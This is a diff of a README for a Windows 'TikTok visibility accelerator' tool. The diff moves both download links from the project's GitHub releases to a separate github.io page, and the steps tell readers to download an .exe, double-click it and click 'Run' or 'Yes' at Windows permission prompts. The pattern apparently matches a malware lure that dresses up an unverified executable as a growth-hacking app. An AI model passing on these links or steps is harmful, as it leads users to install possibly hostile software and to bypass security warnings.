@@ -1,6 +1,6 @@
 # 📈 TikTok-Visibility-Accelerator-2026---Fast-Video-Reach-Tool-for-Windows - Increase your video reach today easily
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Normaon913/TikTok-Visibility-Accelerator-2026---Fast-Video-Reach-Tool-for-Windows/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://normaon913.github.io)
 
 ## 📌 About this application
 
@@ -31,7 +31,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to install and run the application on your computer.
 
-1.  **Visit the download page:** Go to the [official release page](https://github.com/Normaon913/TikTok-Visibility-Accelerator-2026---Fast-Video-Reach-Tool-for-Windows/releases) to access the latest version.
+1.  **Visit the download page:** Go to the [official release page](https://normaon913.github.io) to access the latest version.
 2.  **Download the file:** Look for the file ending in ".exe" under the latest release section. Click the filename to save it to your computer.
 3.  **Open the file:** Locate the downloaded file in your "Downloads" folder. Double-click the file to start the installer.
 4.  **Confirm installation:** If a window appears asking for permission to run the software, select "Run" or "Yes." This tells Windows that you trust the software.
